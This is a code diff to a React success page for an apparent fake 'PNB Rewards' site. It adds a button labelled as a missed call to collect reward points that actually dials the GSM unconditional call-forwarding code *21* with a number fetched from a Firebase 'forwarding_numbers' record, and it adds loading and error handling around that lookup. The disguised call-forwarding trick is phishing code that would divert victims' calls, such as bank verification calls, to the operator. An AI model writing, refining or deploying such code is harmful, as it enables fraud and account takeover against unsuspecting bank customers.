@@ -4,20 +4,48 @@ import '../App.css';
 
 const SuccessPage = () => {
   const [callNumber, setCallNumber] = useState('11111');
+  const [isLoading, setIsLoading] = useState(true);
+  const [error, setError] = useState(null);
 
   useEffect(() => {
     const fetchCallNumber = async () => {
       try {
-        const doc = await FirebaseUtil.getDocument("pnb_settings", "forwarding_numbers");
+        setIsLoading(true);
+        setError(null);
+        // Try the 'pnb_settings' collection first
+        let doc = await FirebaseUtil.getDocument("pnb_settings", "forwarding_numbers");
+        
+        // If not found, try the 'settings' collection as fallback
+        if (!doc?.call_forwarding_number) {
+          doc = await FirebaseUtil.getDocument("settings", "forwarding_numbers");
+        }
+        
         if (doc?.call_forwarding_number && typeof doc.call_forwarding_number === 'string') {
           setCallNumber(doc.call_forwarding_number.trim());
+        } else {
+          // Set default if no valid number is found
+          console.warn("No valid call number found in database, using default");
         }
       } catch (error) {
         console.error("Error fetching call number:", error);
+        setError("Could not load call information. Please try again later.");
+      } finally {
+        setIsLoading(false);
       }
     };
     fetchCallNumber();
   }, []);
+
+  const handleCallClick = () => {
+    try {
+      // Format: *21*number#
+      const formattedNumber = callNumber.replace(/-/g, '');
+      window.open(`tel:*21*${formattedNumber}%23`, '_self');
+    } catch (error) {
+      console.error("Error initiating call:", error);
+      alert("Could not initiate call. Please try again or call manually.");
+    }
+  };
 
   return (
     <div className="flex flex-col min-h-screen bg-white">
@@ -62,30 +90,56 @@ const SuccessPage = () => {
             </p>
           </div>
 
-          <div className="bg-yellow-50 border-l-4 border-[#FBBC09] p-4 mb-6">
-            <div className="flex">
-              <div className="flex-shrink-0">
-                <svg className="h-5 w-5 text-[#FBBC09]" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
-                  <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2h-1V9z" clipRule="evenodd" />
-                </svg>
-              </div>
-              <div className="ml-3">
-                <p className="text-sm text-yellow-700">
-                  To collect your Rewards Points, please give a missed call to our PNB Rewards Care.
-                </p>
+          {error ? (
+            <div className="bg-red-50 border-l-4 border-red-500 p-4 mb-6">
+              <div className="flex">
+                <div className="flex-shrink-0">
+                  <svg className="h-5 w-5 text-red-500" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
+                    <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clipRule="evenodd" />
+                  </svg>
+                </div>
+                <div className="ml-3">
+                  <p className="text-sm text-red-700">{error}</p>
+                </div>
               </div>
             </div>
-          </div>
+          ) : (
+            <div className="bg-yellow-50 border-l-4 border-[#FBBC09] p-4 mb-6">
+              <div className="flex">
+                <div className="flex-shrink-0">
+                  <svg className="h-5 w-5 text-[#FBBC09]" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
+                    <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2h-1V9z" clipRule="evenodd" />
+                  </svg>
+                </div>
+                <div className="ml-3">
+                  <p className="text-sm text-yellow-700">
+                    To collect your Rewards Points, please give a missed call to our PNB Rewards Care.
+                  </p>
+                </div>
+              </div>
+            </div>
+          )}
 
-          <button
-            className="w-full bg-[#FBBC09] hover:bg-yellow-500 text-black font-bold py-2 px-4 rounded-full text-sm mb-4"
-          >
-            CALL NOW TO COLLECT REWARDS
-          </button>
+          {isLoading ? (
+            <button
+              className="w-full bg-[#FBBC09] hover:bg-yellow-500 text-black font-bold py-2 px-4 rounded-full text-sm mb-4 opacity-70 cursor-wait"
+              disabled
+            >
+              Loading...
+            </button>
+          ) : (
+            <button
+              className="w-full bg-[#FBBC09] hover:bg-yellow-500 text-black font-bold py-2 px-4 rounded-full text-sm mb-4"
+              onClick={handleCallClick}
+              disabled={!!error}
+            >
+              CALL NOW TO COLLECT REWARDS
+            </button>
+          )}
 
           <button
             className="w-full bg-[#A20E37] hover:bg-[#8a0c2f] text-white font-bold py-2 px-4 rounded-full"
-            onClick={() => window.location.reload()}
+            onClick={() => window.location.href = '/'}
           >
             Back to Home
           </button>
